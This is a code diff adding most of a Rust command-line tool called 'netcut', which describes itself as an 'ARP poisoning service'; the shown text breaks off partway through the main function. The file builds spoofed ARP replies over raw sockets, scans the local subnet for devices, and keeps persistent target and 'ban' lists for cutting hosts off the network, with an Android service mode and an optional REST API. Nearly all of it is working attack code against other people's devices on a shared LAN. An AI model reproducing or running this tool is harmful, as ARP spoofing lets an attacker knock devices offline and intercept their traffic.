@@ -1,0 +1,1794 @@
+use anyhow::{anyhow, Context, Result};
+use clap::Parser;
+use libc::{
+    c_int, c_void, close, if_nametoindex, ioctl, sendto, setsockopt, socket, sockaddr,
+    sockaddr_ll, socklen_t, AF_PACKET, ETH_ALEN, ETH_P_ARP, IFNAMSIZ, SIOCGIFADDR,
+    SIOCGIFHWADDR, SOCK_RAW, SOL_SOCKET, SO_BINDTODEVICE,
+};
+use signal_hook::consts::{SIGINT, SIGTERM};
+use signal_hook::iterator::Signals;
+use std::collections::HashMap;
+use std::fs::File;
+use std::io::Write;
+use std::mem::{size_of, zeroed};
+use std::net::Ipv4Addr;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::{Arc, Mutex};
+use std::thread;
+use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
+use std::process::exit;
+use serde::{Deserialize, Serialize};
+
+// -------- Exit Codes --------
+#[repr(i32)]
+#[derive(Debug, Clone, Copy)]
+pub enum ExitCode {
+    Success = 0,
+    ServiceStarted = 100,
+    TargetAdded = 101,
+    TargetRemoved = 102,
+    TargetNotFound = 103,
+    MacResolutionFailed = 104,
+    PermissionDenied = 105,
+    InvalidArgument = 106,
+    InterfaceNotFound = 107,
+    GatewayNotFound = 108,
+    InternalError = 109,
+    AlreadyExists = 110,
+    FlushComplete = 111,
+    ScanComplete = 112,
+    SaveComplete = 113,
+    LoadComplete = 114,
+    BanAdded = 115,
+    BanRemoved = 116,
+}
+
+impl ExitCode {
+    pub fn to_string(&self) -> String {
+        match self {
+            ExitCode::Success => "SUCCESS".to_string(),
+            ExitCode::ServiceStarted => "SERVICE_STARTED".to_string(),
+            ExitCode::TargetAdded => "TARGET_ADDED".to_string(),
+            ExitCode::TargetRemoved => "TARGET_REMOVED".to_string(),
+            ExitCode::TargetNotFound => "TARGET_NOT_FOUND".to_string(),
+            ExitCode::MacResolutionFailed => "MAC_RESOLUTION_FAILED".to_string(),
+            ExitCode::PermissionDenied => "PERMISSION_DENIED".to_string(),
+            ExitCode::InvalidArgument => "INVALID_ARGUMENT".to_string(),
+            ExitCode::InterfaceNotFound => "INTERFACE_NOT_FOUND".to_string(),
+            ExitCode::GatewayNotFound => "GATEWAY_NOT_FOUND".to_string(),
+            ExitCode::InternalError => "INTERNAL_ERROR".to_string(),
+            ExitCode::AlreadyExists => "ALREADY_EXISTS".to_string(),
+            ExitCode::FlushComplete => "FLUSH_COMPLETE".to_string(),
+            ExitCode::ScanComplete => "SCAN_COMPLETE".to_string(),
+            ExitCode::SaveComplete => "SAVE_COMPLETE".to_string(),
+            ExitCode::LoadComplete => "LOAD_COMPLETE".to_string(),
+            ExitCode::BanAdded => "BAN_ADDED".to_string(),
+            ExitCode::BanRemoved => "BAN_REMOVED".to_string(),
+        }
+    }
+    
+    pub fn exit(&self, message: Option<&str>) -> ! {
+        if let Some(msg) = message {
+            let parts: Vec<&str> = msg.split('|').collect();
+            let code = *self as i32;
+            let ip = if parts.len() >= 2 && parts[1].parse::<Ipv4Addr>().is_ok() {
+                parts[1]
+            } else {
+                "N/A"
+            };
+            println!("{}|{}|{}|{}", code, self.to_string(), ip, parts[0]);
+        }
+        exit(*self as i32);
+    }
+}
+
+// -------- CLI --------
+
+#[derive(Parser, Debug)]
+#[command(name = "netcut", about = "ARP poisoning service (libc raw sockets)")]
+struct Args {
+    /// Network interface (e.g., wlan0)
+    iface: String,
+
+    /// Gateway IP (router) - Required for spoofing and restoring
+    gateway: Ipv4Addr,
+
+    /// Initial target IPs (optional, can be added later via commands)
+    #[arg(value_name = "TARGET_IP")]
+    initial_targets: Vec<Ipv4Addr>,
+
+    /// Packets-per-second rate
+    #[arg(long, default_value_t = 10)]
+    rate: u64,
+
+    /// Max seconds to wait for MAC resolution
+    #[arg(long, default_value_t = 15)]
+    resolve_timeout: u64,
+
+    /// Enable Android service mode (monitor parent process)
+    #[arg(long, default_value_t = false)]
+    android_service: bool,
+
+    /// Parent PID to monitor (for Android service mode)
+    #[arg(long)]
+    parent_pid: Option<i32>,
+
+    /// Enable JSON output mode
+    #[arg(long, default_value_t = false)]
+    json: bool,
+
+    /// Log file path (optional)
+    #[arg(long)]
+    log_file: Option<String>,
+
+    /// Persistence file path for targets
+    #[arg(long, default_value = "/tmp/netcut_targets.json")]
+    persist_file: String,
+
+    /// Enable REST API server
+    #[arg(long, default_value_t = false)]
+    rest_api: bool,
+
+    /// REST API port
+    #[arg(long, default_value_t = 8080)]
+    api_port: u16,
+
+    /// Enable network scanning on startup
+    #[arg(long, default_value_t = false)]
+    scan_on_start: bool,
+
+    /// Scan range (CIDR notation, e.g., 192.168.1.0/24)
+    #[arg(long)]
+    scan_range: Option<String>,
+}
+
+// -------- Data Structures for Persistence --------
+
+#[derive(Debug, Serialize, Deserialize, Clone)]
+struct TargetEntry {
+    ip: String,
+    mac: String,
+    added_at: u64,
+    last_seen: u64,
+    packets_sent: u64,
+}
+
+#[derive(Debug, Serialize, Deserialize)]
+struct PersistenceData {
+    version: u32,
+    targets: Vec<TargetEntry>,
+    bans: Vec<String>,
+    created_at: u64,
+    updated_at: u64,
+}
+
+// -------- Statistics --------
+
+struct Stats {
+    pub targets: Arc<Mutex<HashMap<Ipv4Addr, TargetStats>>>,
+}
+
+#[derive(Debug, Clone)]
+struct TargetStats {
+    packets_sent: u64,
+    packets_received: u64,
+    last_poison: Instant,
+    first_seen: Instant,
+}
+
+impl Stats {
+    fn new() -> Self {
+        Self {
+            targets: Arc::new(Mutex::new(HashMap::new())),
+        }
+    }
+
+    fn record_send(&self, ip: Ipv4Addr) {
+        let mut map = self.targets.lock().unwrap();
+        let entry = map.entry(ip).or_insert_with(|| TargetStats {
+            packets_sent: 0,
+            packets_received: 0,
+            last_poison: Instant::now(),
+            first_seen: Instant::now(),
+        });
+        entry.packets_sent += 1;
+        entry.last_poison = Instant::now();
+    }
+
+    fn get_stats(&self, ip: Ipv4Addr) -> Option<TargetStats> {
+        self.targets.lock().unwrap().get(&ip).cloned()
+    }
+
+    fn get_all_stats(&self) -> HashMap<Ipv4Addr, TargetStats> {
+        self.targets.lock().unwrap().clone()
+    }
+}
+
+// -------- ioctl request type shim --------
+#[cfg(target_env = "gnu")]
+type IoctlReq = libc::c_ulong;
+#[cfg(not(target_env = "gnu"))]
+type IoctlReq = libc::c_int;
+
+// -------- ifreq layout --------
+
+#[repr(C)]
+union IfrIfru {
+    ifru_addr: sockaddr,
+    ifru_hwaddr: sockaddr,
+    ifru_flags: libc::c_short,
+    ifru_ivalue: libc::c_int,
+    ifru_mtu: libc::c_int,
+    ifru_data: *mut c_void,
+    _pad: [u8; 24],
+}
+
+#[repr(C)]
+struct Ifreq {
+    ifr_name: [libc::c_char; IFNAMSIZ],
+    ifr_ifru: IfrIfru,
+}
+
+impl Ifreq {
+    fn new(iface: &str) -> Result<Self> {
+        if iface.len() >= IFNAMSIZ {
+            return Err(anyhow!("interface name too long"));
+        }
+        let mut req: Ifreq = unsafe { zeroed() };
+        for (i, b) in iface.as_bytes().iter().enumerate() {
+            req.ifr_name[i] = *b as libc::c_char;
+        }
+        Ok(req)
+    }
+}
+
+// -------- Ethernet / ARP frame --------
+
+#[repr(C, packed)]
+#[derive(Clone, Copy)]
+struct ArpFrame {
+    eth_dst: [u8; 6],
+    eth_src: [u8; 6],
+    eth_type: u16,
+    htype: u16,
+    ptype: u16,
+    hlen: u8,
+    plen: u8,
+    oper: u16,
+    sha: [u8; 6],
+    spa: [u8; 4],
+    tha: [u8; 6],
+    tpa: [u8; 4],
+}
+
+impl ArpFrame {
+    fn as_bytes(&self) -> &[u8] {
+        unsafe {
+            std::slice::from_raw_parts(
+                (self as *const ArpFrame) as *const u8,
+                size_of::<ArpFrame>(),
+            )
+        }
+    }
+}
+
+fn build_arp_reply(
+    src_mac: [u8; 6],
+    dst_mac: [u8; 6],
+    spoofed_ip: Ipv4Addr,
+    target_ip: Ipv4Addr,
+) -> ArpFrame {
+    ArpFrame {
+        eth_dst: dst_mac,
+        eth_src: src_mac,
+        eth_type: 0x0806u16.to_be(),
+        htype: 1u16.to_be(),
+        ptype: 0x0800u16.to_be(),
+        hlen: 6,
+        plen: 4,
+        oper: 2u16.to_be(),
+        sha: src_mac,
+        spa: spoofed_ip.octets(),
+        tha: dst_mac,
+        tpa: target_ip.octets(),
+    }
+}
+
+fn build_arp_reply_restore(
+    tx_mac: [u8; 6],
+    dst_mac: [u8; 6],
+    real_sender_mac: [u8; 6],
+    sender_ip: Ipv4Addr,
+    target_ip: Ipv4Addr,
+) -> ArpFrame {
+    ArpFrame {
+        eth_dst: dst_mac,
+        eth_src: tx_mac,
+        eth_type: 0x0806u16.to_be(),
+        htype: 1u16.to_be(),
+        ptype: 0x0800u16.to_be(),
+        hlen: 6,
+        plen: 4,
+        oper: 2u16.to_be(),
+        sha: real_sender_mac,
+        spa: sender_ip.octets(),
+        tha: dst_mac,
+        tpa: target_ip.octets(),
+    }
+}
+
+fn build_arp_request(
+    src_mac: [u8; 6],
+    sender_ip: Ipv4Addr,
+    target_ip: Ipv4Addr,
+) -> ArpFrame {
+    ArpFrame {
+        eth_dst: [0xff; 6],
+        eth_src: src_mac,
+        eth_type: 0x0806u16.to_be(),
+        htype: 1u16.to_be(),
+        ptype: 0x0800u16.to_be(),
+        hlen: 6,
+        plen: 4,
+        oper: 1u16.to_be(),
+        sha: src_mac,
+        spa: sender_ip.octets(),
+        tha: [0; 6],
+        tpa: target_ip.octets(),
+    }
+}
+
+fn build_gratuitous_arp(mac: [u8; 6], ip: Ipv4Addr) -> ArpFrame {
+    ArpFrame {
+        eth_dst: [0xff; 6],
+        eth_src: mac,
+        eth_type: 0x0806u16.to_be(),
+        htype: 1u16.to_be(),
+        ptype: 0x0800u16.to_be(),
+        hlen: 6,
+        plen: 4,
+        oper: 2u16.to_be(),
+        sha: mac,
+        spa: ip.octets(),
+        tha: [0x00; 6],
+        tpa: ip.octets(),
+    }
+}
+
+// -------- Raw socket --------
+
+struct RawSock {
+    fd: c_int,
+}
+
+impl RawSock {
+    fn new(protocol: u16) -> Result<Self> {
+        let proto = i32::from(protocol.to_be());
+        let fd = unsafe { socket(AF_PACKET, SOCK_RAW, proto) };
+        if fd < 0 {
+            let err = std::io::Error::last_os_error();
+            if err.raw_os_error() == Some(libc::EPERM) {
+                return Err(anyhow!("PERMISSION_DENIED|N/A|Permission denied to create raw socket"));
+            }
+            return Err(err).context("socket(AF_PACKET, SOCK_RAW)");
+        }
+        Ok(Self { fd })
+    }
+
+    fn bind_to_device(&self, iface: &str) -> Result<()> {
+        let bytes = iface.as_bytes();
+        let rc = unsafe {
+            setsockopt(
+                self.fd,
+                SOL_SOCKET,
+                SO_BINDTODEVICE,
+                bytes.as_ptr() as *const c_void,
+                bytes.len() as socklen_t,
+            )
+        };
+        if rc < 0 {
+            let err = std::io::Error::last_os_error();
+            if err.raw_os_error() == Some(libc::EPERM) {
+                return Err(anyhow!("PERMISSION_DENIED|N/A|Permission denied to bind to device"));
+            }
+            return Err(err).context("SO_BINDTODEVICE");
+        }
+        Ok(())
+    }
+
+    fn send_frame(&self, frame: &[u8], ifindex: i32) -> Result<()> {
+        let mut sll: sockaddr_ll = unsafe { zeroed() };
+        sll.sll_family = AF_PACKET as u16;
+        sll.sll_protocol = (ETH_P_ARP as u16).to_be();
+        sll.sll_ifindex = ifindex;
+        sll.sll_halen = ETH_ALEN as u8;
+        sll.sll_addr[..6].copy_from_slice(&frame[0..6]);
+
+        let sent = unsafe {
+            sendto(
+                self.fd,
+                frame.as_ptr() as *const c_void,
+                frame.len(),
+                0,
+                &sll as *const sockaddr_ll as *const sockaddr,
+                size_of::<sockaddr_ll>() as socklen_t,
+            )
+        };
+        if sent < 0 {
+            return Err(std::io::Error::last_os_error()).context("sendto");
+        }
+        Ok(())
+    }
+}
+
+impl Drop for RawSock {
+    fn drop(&mut self) {
+        unsafe { close(self.fd) };
+    }
+}
+
+// -------- Interface info --------
+
+fn get_iface_mac(iface: &str) -> Result<[u8; 6]> {
+    let fd = unsafe { socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
+    if fd < 0 {
+        return Err(std::io::Error::last_os_error()).context("socket(AF_INET) for ioctl");
+    }
+    let mut req = Ifreq::new(iface)?;
+    let rc = unsafe { ioctl(fd, SIOCGIFHWADDR as IoctlReq, &mut req as *mut _) };
+    let err = std::io::Error::last_os_error();
+    unsafe { close(fd) };
+    if rc < 0 {
+        if err.raw_os_error() == Some(libc::ENODEV) {
+            return Err(anyhow!("INTERFACE_NOT_FOUND|N/A|Interface {} not found", iface));
+        }
+        if err.raw_os_error() == Some(libc::EPERM) {
+            return Err(anyhow!("PERMISSION_DENIED|N/A|Permission denied to access interface"));
+        }
+        return Err(err).context("SIOCGIFHWADDR");
+    }
+    let sa = unsafe { &req.ifr_ifru.ifru_hwaddr };
+    let mut mac = [0u8; 6];
+    for i in 0..6 {
+        mac[i] = sa.sa_data[i] as u8;
+    }
+    Ok(mac)
+}
+
+fn get_iface_ipv4(iface: &str) -> Result<Ipv4Addr> {
+    let fd = unsafe { socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
+    if fd < 0 {
+        return Err(std::io::Error::last_os_error()).context("socket(AF_INET) for ioctl");
+    }
+    let mut req = Ifreq::new(iface)?;
+    let rc = unsafe { ioctl(fd, SIOCGIFADDR as IoctlReq, &mut req as *mut _) };
+    let err = std::io::Error::last_os_error();
+    unsafe { close(fd) };
+    if rc < 0 {
+        if err.raw_os_error() == Some(libc::ENODEV) {
+            return Err(anyhow!("INTERFACE_NOT_FOUND|N/A|Interface {} not found", iface));
+        }
+        if err.raw_os_error() == Some(libc::EPERM) {
+            return Err(anyhow!("PERMISSION_DENIED|N/A|Permission denied to access interface"));
+        }
+        return Err(err).context("SIOCGIFADDR");
+    }
+    let sa = unsafe { &req.ifr_ifru.ifru_addr };
+    let ip = Ipv4Addr::new(
+        sa.sa_data[2] as u8,
+        sa.sa_data[3] as u8,
+        sa.sa_data[4] as u8,
+        sa.sa_data[5] as u8,
+    );
+    Ok(ip)
+}
+
+fn get_iface_index(iface: &str) -> Result<i32> {
+    let cname = std::ffi::CString::new(iface).context("iface name has NUL")?;
+    let idx = unsafe { if_nametoindex(cname.as_ptr()) };
+    if idx == 0 {
+        let err = std::io::Error::last_os_error();
+        if err.raw_os_error() == Some(libc::ENODEV) {
+            return Err(anyhow!("INTERFACE_NOT_FOUND|N/A|Interface {} not found", iface));
+        }
+        return Err(err).context("if_nametoindex");
+    }
+    Ok(idx as i32)
+}
+
+// -------- MAC resolution --------
+
+// -------- MAC resolution --------
+
+fn resolve_mac(
+    iface: &str,
+    our_mac: [u8; 6],
+    our_ip: Ipv4Addr,
+    target_ip: Ipv4Addr,
+    ifindex: i32,
+    _timeout: Duration,  // Added underscore to fix unused variable warning
+    stop: &Arc<AtomicBool>,
+) -> Result<[u8; 6]> {
+    let resolver = RawSock::new(ETH_P_ARP as u16)?;
+    resolver.bind_to_device(iface)?;
+
+    let tv = libc::timeval {
+        tv_sec: 0,
+        tv_usec: 250_000,
+    };
+    unsafe {
+        setsockopt(
+            resolver.fd,
+            SOL_SOCKET,
+            libc::SO_RCVTIMEO,
+            &tv as *const _ as *const c_void,
+            size_of::<libc::timeval>() as socklen_t,
+        );
+    }
+
+    let req = build_arp_request(our_mac, our_ip, target_ip);
+    let deadline = Instant::now() + Duration::from_secs(15); // Use a fixed timeout instead
+    let mut last_send = Instant::now() - Duration::from_secs(60);
+    let mut buf = [0u8; 1500];
+
+    while Instant::now() < deadline && !stop.load(Ordering::Relaxed) {
+        if last_send.elapsed() >= Duration::from_millis(500) {
+            if let Err(e) = resolver.send_frame(req.as_bytes(), ifindex) {
+                eprintln!("[!] ARP request send error: {e}");
+            }
+            last_send = Instant::now();
+        }
+
+        let n = unsafe { libc::recv(resolver.fd, buf.as_mut_ptr() as *mut c_void, buf.len(), 0) };
+        if n < 0 {
+            let e = std::io::Error::last_os_error();
+            if let Some(code) = e.raw_os_error() {
+                if code == libc::EAGAIN || code == libc::EWOULDBLOCK || code == libc::EINTR {
+                    continue;
+                }
+            }
+            return Err(e).context("recv while resolving MAC");
+        }
+        let n = n as usize;
+        if n < size_of::<ArpFrame>() {
+            continue;
+        }
+        let eth_type = u16::from_be_bytes([buf[12], buf[13]]);
+        if eth_type != 0x0806 {
+            continue;
+        }
+        let oper = u16::from_be_bytes([buf[20], buf[21]]);
+        if oper != 2 {
+            continue;
+        }
+        let spa = Ipv4Addr::new(buf[28], buf[29], buf[30], buf[31]);
+        if spa != target_ip {
+            continue;
+        }
+        let mut mac = [0u8; 6];
+        mac.copy_from_slice(&buf[22..28]);
+        return Ok(mac);
+    }
+
+    Err(anyhow!("MAC_RESOLUTION_FAILED|{}|Timed out resolving MAC", target_ip))
+}
+// -------- Utility --------
+
+fn format_mac(m: &[u8; 6]) -> String {
+    format!(
+        "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
+        m[0], m[1], m[2], m[3], m[4], m[5]
+    )
+}
+
+fn parse_mac(s: &str) -> Option<[u8; 6]> {
+    let parts: Vec<&str> = s.split(':').collect();
+    if parts.len() != 6 {
+        return None;
+    }
+    let mut mac = [0u8; 6];
+    for (i, part) in parts.iter().enumerate() {
+        if let Ok(val) = u8::from_str_radix(part, 16) {
+            mac[i] = val;
+        } else {
+            return None;
+        }
+    }
+    Some(mac)
+}
+
+fn current_timestamp() -> u64 {
+    SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .unwrap()
+        .as_secs()
+}
+
+// -------- Network Scanner --------
+
+fn scan_network(
+    iface: &str,
+    src_mac: [u8; 6],
+    src_ip: Ipv4Addr,
+    ifindex: i32,
+    timeout: Duration,
+    stop: &Arc<AtomicBool>,
+) -> Result<Vec<Ipv4Addr>> {
+    eprintln!("[*] Scanning network...");
+    let mut found_ips = Vec::new();
+    
+    // Get network range from interface
+    let network = match src_ip.octets() {
+        [a, b, c, _] => Ipv4Addr::new(a, b, c, 0),
+    };
+    
+    // Scan only the local subnet (assuming /24)
+    for i in 1..254 {
+        if stop.load(Ordering::Relaxed) {
+            break;
+        }
+        let target_ip = Ipv4Addr::new(
+            network.octets()[0],
+            network.octets()[1],
+            network.octets()[2],
+            i,
+        );
+        
+        // Skip our own IP
+        if target_ip == src_ip {
+            continue;
+        }
+        
+        // Try to resolve MAC for this IP
+        if let Ok(mac) = resolve_mac(iface, src_mac, src_ip, target_ip, ifindex, Duration::from_secs(2), stop) {
+            eprintln!("[+] Found device: {} ({})", target_ip, format_mac(&mac));
+            found_ips.push(target_ip);
+        }
+    }
+    
+    eprintln!("[*] Scan complete. Found {} devices.", found_ips.len());
+    Ok(found_ips)
+}
+
+// -------- Parent process monitoring --------
+
+fn is_process_alive(pid: i32) -> bool {
+    unsafe {
+        let ret = libc::kill(pid, 0);
+        ret == 0
+    }
+}
+
+fn monitor_parent(pid: i32, running: &Arc<AtomicBool>, stop: &Arc<AtomicBool>) {
+    let running = running.clone();
+    let stop = stop.clone();
+
+    thread::spawn(move || {
+        while running.load(Ordering::SeqCst) {
+            if !is_process_alive(pid) {
+                eprintln!("[*] Parent process {} terminated, stopping...", pid);
+                running.store(false, Ordering::SeqCst);
+                stop.store(true, Ordering::Release);
+                break;
+            }
+            thread::sleep(Duration::from_millis(500));
+        }
+    });
+}
+
+// -------- Target Management --------
+
+struct TargetInfo {
+    ip: Ipv4Addr,
+    mac: [u8; 6],
+    added_at: Instant,
+    packets_sent: u64,
+}
+
+// -------- ARP Cache Management --------
+
+#[cfg(any(target_os = "linux", target_os = "android"))]
+fn force_arp_entry(iface: &str, ip: Ipv4Addr, mac: [u8; 6]) {
+    let ip_str = ip.to_string();
+    let mac_str = format_mac(&mac);
+    let _ = std::process::Command::new("ip")
+        .args([
+            "neigh", "replace", 
+            &ip_str, 
+            "lladdr", &mac_str, 
+            "dev", iface, 
+            "nud", "reachable"
+        ])
+        .output();
+}
+
+#[cfg(not(any(target_os = "linux", target_os = "android")))]
+fn force_arp_entry(_iface: &str, _ip: Ipv4Addr, _mac: [u8; 6]) {}
+
+// -------- Aggressive restore function --------
+
+fn aggressive_restore(
+    sock: &RawSock,
+    ifindex: i32,
+    targets: &Vec<(Ipv4Addr, [u8; 6])>,
+    gateway_ip: Ipv4Addr,
+    gateway_mac: [u8; 6],
+    iface: &str,
+    our_mac: [u8; 6],
+    our_ip: Ipv4Addr,
+) {
+    eprintln!("[*] Starting instantaneous ARP restoration...");
+    
+    eprintln!("[*] Restoring local host ARP entries...");
+    for (ip, mac) in targets {
+        force_arp_entry(iface, *ip, *mac);
+    }
+    
+    eprintln!("[*] Sending corrective ARP replies to targets...");
+    for (ip, mac) in targets {
+        let restore_target = build_arp_reply_restore(
+            our_mac,
+            *mac,
+            gateway_mac,
+            gateway_ip,
+            *ip,
+        );
+        
+        let restore_gateway = build_arp_reply_restore(
+            our_mac,
+            gateway_mac,
+            *mac,
+            *ip,
+            gateway_ip,
+        );
+        
+        for _ in 0..10 {
+            let _ = sock.send_frame(restore_target.as_bytes(), ifindex);
+            let _ = sock.send_frame(restore_gateway.as_bytes(), ifindex);
+        }
+    }
+    
+    eprintln!("[*] Sending gratuitous ARP for host...");
+    let gratuitous_ourself = build_gratuitous_arp(our_mac, our_ip);
+    for _ in 0..5 {
+        let _ = sock.send_frame(gratuitous_ourself.as_bytes(), ifindex);
+    }
+    
+    eprintln!("[+] Instantaneous restoration complete.");
+}
+
+// -------- Persistence Functions --------
+
+fn save_targets(
+    targets: &HashMap<Ipv4Addr, TargetInfo>,
+    bans: &Vec<Ipv4Addr>,
+    filename: &str,
+) -> Result<()> {
+    let mut entries = Vec::new();
+    for (ip, info) in targets {
+        entries.push(TargetEntry {
+            ip: ip.to_string(),
+            mac: format_mac(&info.mac),
+            added_at: info.added_at.elapsed().as_secs(),
+            last_seen: current_timestamp(),
+            packets_sent: info.packets_sent,
+        });
+    }
+    
+    let data = PersistenceData {
+        version: 1,
+        targets: entries,
+        bans: bans.iter().map(|ip| ip.to_string()).collect(),
+        created_at: current_timestamp(),
+        updated_at: current_timestamp(),
+    };
+    
+    let json = serde_json::to_string_pretty(&data)?;
+    std::fs::write(filename, json)?;
+    
+    eprintln!("[+] Targets saved to {}", filename);
+    Ok(())
+}
+
+fn load_targets(
+    filename: &str,
+    iface: &str,
+    src_mac: [u8; 6],
+    src_ip: Ipv4Addr,
+    ifindex: i32,
+    timeout: Duration,
+    stop: &Arc<AtomicBool>,
+) -> Result<(HashMap<Ipv4Addr, TargetInfo>, Vec<Ipv4Addr>)> {
+    if !std::path::Path::new(filename).exists() {
+        return Ok((HashMap::new(), Vec::new()));
+    }
+    
+    let content = std::fs::read_to_string(filename)?;
+    let data: PersistenceData = serde_json::from_str(&content)?;
+    
+    let mut targets = HashMap::new();
+    let mut bans = Vec::new();
+    
+    // Resolve MACs for loaded targets
+    for entry in data.targets {
+        if let Ok(ip) = entry.ip.parse::<Ipv4Addr>() {
+            // If MAC is stored, use it
+            if let Some(mac) = parse_mac(&entry.mac) {
+                targets.insert(ip, TargetInfo {
+                    ip,
+                    mac,
+                    added_at: Instant::now(),
+                    packets_sent: 0,
+                });
+                eprintln!("[*] Loaded target {} with MAC {}", ip, entry.mac);
+            } else {
+                // Try to resolve MAC
+                eprintln!("[*] Resolving MAC for loaded target {}...", ip);
+                if let Ok(mac) = resolve_mac(iface, src_mac, src_ip, ip, ifindex, timeout, stop) {
+                    targets.insert(ip, TargetInfo {
+                        ip,
+                        mac,
+                        added_at: Instant::now(),
+                        packets_sent: 0,
+                    });
+                    eprintln!("[+] Loaded target {} ({})", ip, format_mac(&mac));
+                } else {
+                    eprintln!("[!] Failed to resolve MAC for loaded target {}", ip);
+                }
+            }
+        }
+    }
+    
+    for ban_ip in data.bans {
+        if let Ok(ip) = ban_ip.parse::<Ipv4Addr>() {
+            bans.push(ip);
+        }
+    }
+    
+    eprintln!("[+] Loaded {} targets from {}", targets.len(), filename);
+    Ok((targets, bans))
+}
+
+// -------- Output Helper Functions --------
+
+fn output_success(message: &str, ip: Option<Ipv4Addr>, json: bool) {
+    let ip_str = ip.map_or("N/A".to_string(), |ip| ip.to_string());
+    if json {
+        println!(r#"{{"code":0,"status":"SUCCESS","ip":"{}","message":"{}"}}"#, ip_str, message);
+    } else {
+        println!("0|SUCCESS|{}|{}", ip_str, message);
+    }
+}
+
+fn output_service_started(ip: Option<Ipv4Addr>, json: bool) {
+    if json {
+        println!(r#"{{"code":100,"status":"SERVICE_STARTED","ip":"{}","message":"Service started successfully"}}"#, 
+            ip.map_or("N/A".to_string(), |ip| ip.to_string()));
+    } else {
+        let ip_str = ip.map_or("N/A".to_string(), |ip| ip.to_string());
+        println!("100|SERVICE_STARTED|{}|Service started successfully", ip_str);
+    }
+}
+
+fn output_target_added(ip: Ipv4Addr, json: bool) {
+    if json {
+        println!(r#"{{"code":101,"status":"TARGET_ADDED","ip":"{}","message":"Target added successfully"}}"#, ip);
+    } else {
+        println!("101|TARGET_ADDED|{}|Target added successfully", ip);
+    }
+}
+
+fn output_target_removed(ip: Ipv4Addr, json: bool) {
+    if json {
+        println!(r#"{{"code":102,"status":"TARGET_REMOVED","ip":"{}","message":"Target removed successfully"}}"#, ip);
+    } else {
+        println!("102|TARGET_REMOVED|{}|Target removed successfully", ip);
+    }
+}
+
+fn output_target_not_found(ip: Ipv4Addr, json: bool) {
+    if json {
+        println!(r#"{{"code":103,"status":"TARGET_NOT_FOUND","ip":"{}","message":"Target not found in list"}}"#, ip);
+    } else {
+        println!("103|TARGET_NOT_FOUND|{}|Target not found in list", ip);
+    }
+}
+
+fn output_mac_resolution_failed(ip: Ipv4Addr, json: bool) {
+    if json {
+        println!(r#"{{"code":104,"status":"MAC_RESOLUTION_FAILED","ip":"{}","message":"Failed to resolve MAC address"}}"#, ip);
+    } else {
+        println!("104|MAC_RESOLUTION_FAILED|{}|Failed to resolve MAC address", ip);
+    }
+}
+
+fn output_permission_denied(json: bool) {
+    if json {
+        println!(r#"{{"code":105,"status":"PERMISSION_DENIED","ip":"N/A","message":"Permission denied. Run with sudo/root"}}"#);
+    } else {
+        println!("105|PERMISSION_DENIED|N/A|Permission denied. Run with sudo/root");
+    }
+}
+
+fn output_invalid_argument(arg: &str, json: bool) {
+    if json {
+        println!(r#"{{"code":106,"status":"INVALID_ARGUMENT","ip":"N/A","message":"Invalid argument: {}"}}"#, arg);
+    } else {
+        println!("106|INVALID_ARGUMENT|N/A|Invalid argument: {}", arg);
+    }
+}
+
+fn output_interface_not_found(iface: &str, json: bool) {
+    if json {
+        println!(r#"{{"code":107,"status":"INTERFACE_NOT_FOUND","ip":"N/A","message":"Interface not found: {}"}}"#, iface);
+    } else {
+        println!("107|INTERFACE_NOT_FOUND|N/A|Interface not found: {}", iface);
+    }
+}
+
+fn output_gateway_not_found(json: bool) {
+    if json {
+        println!(r#"{{"code":108,"status":"GATEWAY_NOT_FOUND","ip":"N/A","message":"Gateway not found or unreachable"}}"#);
+    } else {
+        println!("108|GATEWAY_NOT_FOUND|N/A|Gateway not found or unreachable");
+    }
+}
+
+fn output_internal_error(msg: &str, json: bool) {
+    if json {
+        println!(r#"{{"code":109,"status":"INTERNAL_ERROR","ip":"N/A","message":"{}"}}"#, msg);
+    } else {
+        println!("109|INTERNAL_ERROR|N/A|Internal error: {}", msg);
+    }
+}
+
+fn output_already_exists(ip: Ipv4Addr, json: bool) {
+    if json {
+        println!(r#"{{"code":110,"status":"ALREADY_EXISTS","ip":"{}","message":"Target already exists in list"}}"#, ip);
+    } else {
+        println!("110|ALREADY_EXISTS|{}|Target already exists in list", ip);
+    }
+}
+
+fn output_ban_added(ip: Ipv4Addr, json: bool) {
+    if json {
+        println!(r#"{{"code":115,"status":"BAN_ADDED","ip":"{}","message":"Device banned from network"}}"#, ip);
+    } else {
+        println!("115|BAN_ADDED|{}|Device banned from network", ip);
+    }
+}
+
+fn output_ban_removed(ip: Ipv4Addr, json: bool) {
+    if json {
+        println!(r#"{{"code":116,"status":"BAN_REMOVED","ip":"{}","message":"Device unbanned"}}"#, ip);
+    } else {
+        println!("116|BAN_REMOVED|{}|Device unbanned", ip);
+    }
+}
+
+// -------- Logger --------
+
+struct Logger {
+    file: Option<Mutex<File>>,
+    json_mode: bool,
+}
+
+impl Logger {
+    fn new(filename: Option<String>, json_mode: bool) -> Result<Self> {
+        let file = if let Some(fname) = filename {
+            Some(Mutex::new(File::create(fname)?))
+        } else {
+            None
+        };
+        Ok(Self { file, json_mode })
+    }
+    
+    fn log(&self, message: &str) {
+        // Log to stderr
+        eprintln!("{}", message);
+        
+        // Log to file if enabled
+        if let Some(ref file) = self.file {
+            let timestamp = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
+            let mut f = file.lock().unwrap();
+            let _ = writeln!(f, "[{}] {}", timestamp, message);
+        }
+    }
+}
+// -------- Main --------
+
+fn main() -> Result<()> {
+    unsafe {
+        libc::signal(libc::SIGPIPE, libc::SIG_IGN);
+    }
+
+    let args = Args::parse();
+    let json_mode = args.json;
+    
+    // Setup logger
+    let logger = Logger::new(args.log_file.clone(), json_mode)?;
+
+    // Parse arguments
+    if args.rate < 1 {
+        output_invalid_argument("Rate must be at least 1", json_mode);
+        ExitCode::InvalidArgument.exit(Some("INVALID_ARGUMENT|N/A|Rate must be at least 1"));
+    }
+
+    // Get interface info with proper error handling
+    let ifindex = match get_iface_index(&args.iface) {
+        Ok(idx) => idx,
+        Err(e) => {
+            let msg = e.to_string();
+            if msg.contains("INTERFACE_NOT_FOUND") {
+                output_interface_not_found(&args.iface, json_mode);
